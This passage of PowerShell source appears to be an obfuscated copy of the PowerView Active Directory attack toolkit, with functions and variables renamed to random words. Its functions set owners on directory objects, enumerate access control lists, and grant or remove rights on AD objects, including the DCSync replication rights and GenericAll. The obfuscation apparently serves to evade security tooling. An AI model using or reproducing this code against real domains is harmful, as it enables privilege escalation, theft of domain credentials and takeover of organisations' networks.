        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $drxMJvPm99,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $kXnpboQQ99,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $aNHMAMUd99,
        [Guid]
        $qduViUcj99
    )
    Begin {
        if ($QLwgZZqU99 -notmatch '^S-1-.*') {
            $psQSOFrA99 = @{
                'Identity' = $QLwgZZqU99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $psQSOFrA99['Domain'] = $lHkIOVol99 }
            if ($PSBoundParameters['Server']) { $psQSOFrA99['Server'] = $GejzMkbd99 }
            if ($PSBoundParameters['SearchScope']) { $psQSOFrA99['SearchScope'] = $yuycROvu99 }
            if ($PSBoundParameters['ResultPageSize']) { $psQSOFrA99['ResultPageSize'] = $vUSyLBJJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $psQSOFrA99['ServerTimeLimit'] = $cNGaYdSy99 }
            if ($PSBoundParameters['Tombstone']) { $psQSOFrA99['Tombstone'] = $kQTByXSX99 }
            if ($PSBoundParameters['Credential']) { $psQSOFrA99['Credential'] = $xjRyyQze99 }
            $iKpGXEry99 = scram @PrincipalSearcherArguments
            if (-not $iKpGXEry99) {
                throw "Unable to resolve principal: $QLwgZZqU99"
            }
            elseif($iKpGXEry99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $aBusFQKN99 = $iKpGXEry99.objectsid
        }
        else {
            $aBusFQKN99 = $QLwgZZqU99
        }
        $SQfadSjo99 = 0
        foreach($r in $Right) {
            $SQfadSjo99 = $SQfadSjo99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $SQfadSjo99 = [System.DirectoryServices.ActiveDirectoryRights]$SQfadSjo99
        $phaEiMpW99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$aBusFQKN99)
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
            if($kXnpboQQ99 -eq $null -and $aNHMAMUd99 -eq [String]::Empty -and $qduViUcj99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $drxMJvPm99
            } elseif($kXnpboQQ99 -eq $null -and $aNHMAMUd99 -ne [String]::Empty -and $qduViUcj99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $drxMJvPm99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$aNHMAMUd99)
            } elseif($kXnpboQQ99 -eq $null -and $aNHMAMUd99 -ne [String]::Empty -and $qduViUcj99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $drxMJvPm99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$aNHMAMUd99), $qduViUcj99
            } elseif($kXnpboQQ99 -ne $null -and $aNHMAMUd99 -eq [String]::Empty -and $qduViUcj99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $drxMJvPm99, $kXnpboQQ99
            } elseif($kXnpboQQ99 -ne $null -and $aNHMAMUd99 -ne [String]::Empty -and $qduViUcj99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $drxMJvPm99, $kXnpboQQ99, $aNHMAMUd99
            } elseif($kXnpboQQ99 -ne $null -and $aNHMAMUd99 -ne [String]::Empty -and $qduViUcj99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $drxMJvPm99, $kXnpboQQ99, $aNHMAMUd99, $qduViUcj99
            }
        }
        else {
            if($kXnpboQQ99 -eq $null -and $aNHMAMUd99 -eq [String]::Empty -and $qduViUcj99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $pEoeOaDZ99
            } elseif($kXnpboQQ99 -eq $null -and $aNHMAMUd99 -ne [String]::Empty -and $qduViUcj99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $pEoeOaDZ99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$aNHMAMUd99)
            } elseif($kXnpboQQ99 -eq $null -and $aNHMAMUd99 -ne [String]::Empty -and $qduViUcj99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $pEoeOaDZ99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$aNHMAMUd99), $qduViUcj99
            } elseif($kXnpboQQ99 -ne $null -and $aNHMAMUd99 -eq [String]::Empty -and $qduViUcj99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $pEoeOaDZ99, $kXnpboQQ99
            } elseif($kXnpboQQ99 -ne $null -and $aNHMAMUd99 -ne [String]::Empty -and $qduViUcj99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $pEoeOaDZ99, $kXnpboQQ99, $aNHMAMUd99
            } elseif($kXnpboQQ99 -ne $null -and $aNHMAMUd99 -ne [String]::Empty -and $qduViUcj99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $phaEiMpW99, $SQfadSjo99, $pEoeOaDZ99, $kXnpboQQ99, $aNHMAMUd99, $qduViUcj99
            }
        }
    }
}
function tribesman {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $phaEiMpW99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $YPRJgByK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $VrICpjXS99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $vXyeSKHK99 = scram @SearcherArguments -phaEiMpW99 $YPRJgByK99 -PjvsRTzX99 objectsid | Select-Object -ExpandProperty objectsid
        if ($vXyeSKHK99) {
            $lfXohxza99 = [System.Security.Principal.SecurityIdentifier]$vXyeSKHK99
        }
        else {
            Write-Warning "[tribesman] Error parsing owner identity '$YPRJgByK99'"
        }
    }
    PROCESS {
        if ($lfXohxza99) {
            $VrICpjXS99['Raw'] = $True
            $VrICpjXS99['Identity'] = $phaEiMpW99
            $PEKZZkkP99 = scram @SearcherArguments
            ForEach ($Object in $PEKZZkkP99) {
                try {
                    Write-Verbose "[tribesman] Attempting to set the owner for '$phaEiMpW99' to '$YPRJgByK99'"
                    $Entry = $PEKZZkkP99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($lfXohxza99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[tribesman] Error setting owner: $_"
                }
            }
        }
    }
}
function striking {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $phaEiMpW99,
        [Switch]
        $Sacl,
        [Switch]
        $NqHBpnUT99,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $AxlkOdCi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }
        if ($PSBoundParameters['Sacl']) {
            $VrICpjXS99['SecurityMasks'] = 'Sacl'
        }
        else {
            $VrICpjXS99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $qnVcpqaH99 = indenturing @SearcherArguments
        $sxLRSpci99 = @{}
        if ($PSBoundParameters['Domain']) { $sxLRSpci99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $sxLRSpci99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['ResultPageSize']) { $sxLRSpci99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sxLRSpci99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Credential']) { $sxLRSpci99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = skyward @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($qnVcpqaH99) {
            $hAflFVrb99 = ''
            $tGcqvLrx99 = ''
            $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($SvGoFRkz99 -match '^S-1-.*') {
                    $hAflFVrb99 += "(objectsid=$SvGoFRkz99)"
                }
                elseif ($SvGoFRkz99 -match '^(CN|OU|DC)=.*') {
                    $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[striking] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                        $VrICpjXS99['Domain'] = $chKaCwXV99
                        $qnVcpqaH99 = indenturing @SearcherArguments
                        if (-not $qnVcpqaH99) {
                            Write-Warning "[striking] Unable to retrieve domain searcher for '$chKaCwXV99'"
                        }
                    }
                }
                elseif ($SvGoFRkz99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $PFeUtWYw99 = (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                }
                elseif ($SvGoFRkz99.Contains('.')) {
                    $hAflFVrb99 += "(|(samAccountName=$SvGoFRkz99)(name=$SvGoFRkz99)(dnshostname=$SvGoFRkz99))"
                }
                else {
                    $hAflFVrb99 += "(|(samAccountName=$SvGoFRkz99)(name=$SvGoFRkz99)(displayname=$SvGoFRkz99))"
                }
            }
            if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                $tGcqvLrx99 += "(|$hAflFVrb99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[striking] Using additional LDAP filter: $vqxjYeAS99"
                $tGcqvLrx99 += "$vqxjYeAS99"
            }
            if ($tGcqvLrx99) {
                $qnVcpqaH99.filter = "(&$tGcqvLrx99)"
            }
            Write-Verbose "[striking] striking filter string: $($qnVcpqaH99.filter)"
            $jAOXTyAF99 = $qnVcpqaH99.FindAll()
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $aBusFQKN99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $aBusFQKN99 = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $KqCPCpJO99 = Switch ($AxlkOdCi99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $KqCPCpJO99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $aBusFQKN99
                                $nBMHTicS99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $aBusFQKN99
                            $nBMHTicS99 = $True
                        }
                        if ($nBMHTicS99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $pvcKvcPB99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $pvcKvcPB99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $pvcKvcPB99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $pvcKvcPB99[$_.Name] = $_.Value
                                    }
                                }
                                $nWxcWuid99 = New-Object -TypeName PSObject -Property $pvcKvcPB99
                                $nWxcWuid99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $nWxcWuid99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[striking] Error: $_"
                }
            }
        }
    }
}
function envisioning {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $RwjEVSPw99,
        [ValidateNotNullOrEmpty()]
        [String]
        $udnfiLvJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $fsBNvCdv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fZOkGeht99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $QLwgZZqU99,
        [ValidateNotNullOrEmpty()]
        [String]
        $lHkIOVol99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $cxBjlZvy99 = 'All',
        [Guid]
        $JBKDrCXZ99
    )
    BEGIN {
        $uoZVeQMI99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $uoZVeQMI99['Domain'] = $udnfiLvJ99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $uoZVeQMI99['LDAPFilter'] = $fsBNvCdv99 }
        if ($PSBoundParameters['TargetSearchBase']) { $uoZVeQMI99['SearchBase'] = $fZOkGeht99 }
        if ($PSBoundParameters['Server']) { $uoZVeQMI99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $uoZVeQMI99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $uoZVeQMI99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $uoZVeQMI99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $uoZVeQMI99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $uoZVeQMI99['Credential'] = $xjRyyQze99 }
        $psQSOFrA99 = @{
            'Identity' = $QLwgZZqU99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $psQSOFrA99['Domain'] = $lHkIOVol99 }
        if ($PSBoundParameters['Server']) { $psQSOFrA99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $psQSOFrA99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $psQSOFrA99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $psQSOFrA99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $psQSOFrA99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $psQSOFrA99['Credential'] = $xjRyyQze99 }
        $fHsqEmFJ99 = scram @PrincipalSearcherArguments
        if (-not $fHsqEmFJ99) {
            throw "Unable to resolve principal: $QLwgZZqU99"
        }
    }
    PROCESS {
        $uoZVeQMI99['Identity'] = $RwjEVSPw99
        $cduLQQnc99 = scram @TargetSearcherArguments
        ForEach ($SJlKmTct99 in $cduLQQnc99) {
            $aNHMAMUd99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $oUDiAALP99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($JBKDrCXZ99) {
                $GUIDs = @($JBKDrCXZ99)
            }
            else {
                $GUIDs = Switch ($cxBjlZvy99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($eFQQKEAU99 in $fHsqEmFJ99) {
                Write-Verbose "[envisioning] Granting principal $($eFQQKEAU99.distinguishedname) '$cxBjlZvy99' on $($SJlKmTct99.Properties.distinguishedname)"
                try {
                    $phaEiMpW99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$eFQQKEAU99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $BWaxmvYR99 = New-Object Guid $GUID
                            $KrUnOJjT99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $phaEiMpW99, $KrUnOJjT99, $oUDiAALP99, $BWaxmvYR99, $aNHMAMUd99
                        }
                    }
                    else {
                        $KrUnOJjT99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $phaEiMpW99, $KrUnOJjT99, $oUDiAALP99, $aNHMAMUd99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[envisioning] Granting principal $($eFQQKEAU99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($SJlKmTct99.Properties.distinguishedname)"
                        $xvaeQNCY99 = $SJlKmTct99.GetDirectoryEntry()
                        $xvaeQNCY99.PsBase.Options.SecurityMasks = 'Dacl'
                        $xvaeQNCY99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $xvaeQNCY99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[envisioning] Error granting principal $($eFQQKEAU99.distinguishedname) '$cxBjlZvy99' on $($SJlKmTct99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function bilious {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $RwjEVSPw99,
        [ValidateNotNullOrEmpty()]
        [String]
        $udnfiLvJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $fsBNvCdv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fZOkGeht99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $QLwgZZqU99,
        [ValidateNotNullOrEmpty()]
        [String]
        $lHkIOVol99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $cxBjlZvy99 = 'All',
        [Guid]
        $JBKDrCXZ99
    )
    BEGIN {
        $uoZVeQMI99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $uoZVeQMI99['Domain'] = $udnfiLvJ99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $uoZVeQMI99['LDAPFilter'] = $fsBNvCdv99 }
        if ($PSBoundParameters['TargetSearchBase']) { $uoZVeQMI99['SearchBase'] = $fZOkGeht99 }
        if ($PSBoundParameters['Server']) { $uoZVeQMI99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $uoZVeQMI99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $uoZVeQMI99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $uoZVeQMI99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $uoZVeQMI99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $uoZVeQMI99['Credential'] = $xjRyyQze99 }
        $psQSOFrA99 = @{
            'Identity' = $QLwgZZqU99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $psQSOFrA99['Domain'] = $lHkIOVol99 }
        if ($PSBoundParameters['Server']) { $psQSOFrA99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $psQSOFrA99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $psQSOFrA99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $psQSOFrA99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $psQSOFrA99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $psQSOFrA99['Credential'] = $xjRyyQze99 }
        $fHsqEmFJ99 = scram @PrincipalSearcherArguments
        if (-not $fHsqEmFJ99) {
            throw "Unable to resolve principal: $QLwgZZqU99"
        }
    }
    PROCESS {
        $uoZVeQMI99['Identity'] = $RwjEVSPw99
        $cduLQQnc99 = scram @TargetSearcherArguments
        ForEach ($SJlKmTct99 in $cduLQQnc99) {
            $aNHMAMUd99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $oUDiAALP99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($JBKDrCXZ99) {
                $GUIDs = @($JBKDrCXZ99)
            }
            else {
                $GUIDs = Switch ($cxBjlZvy99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($eFQQKEAU99 in $fHsqEmFJ99) {
                Write-Verbose "[bilious] Removing principal $($eFQQKEAU99.distinguishedname) '$cxBjlZvy99' from $($SJlKmTct99.Properties.distinguishedname)"
                try {
                    $phaEiMpW99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$eFQQKEAU99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $BWaxmvYR99 = New-Object Guid $GUID
                            $KrUnOJjT99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $phaEiMpW99, $KrUnOJjT99, $oUDiAALP99, $BWaxmvYR99, $aNHMAMUd99
                        }
                    }
                    else {
                        $KrUnOJjT99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $phaEiMpW99, $KrUnOJjT99, $oUDiAALP99, $aNHMAMUd99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[bilious] Granting principal $($eFQQKEAU99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($SJlKmTct99.Properties.distinguishedname)"
                        $xvaeQNCY99 = $SJlKmTct99.GetDirectoryEntry()
                        $xvaeQNCY99.PsBase.Options.SecurityMasks = 'Dacl'
                        $xvaeQNCY99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $xvaeQNCY99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[bilious] Error removing principal $($eFQQKEAU99.distinguishedname) '$cxBjlZvy99' from $($SJlKmTct99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function migrated {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $gddrYpaX99,
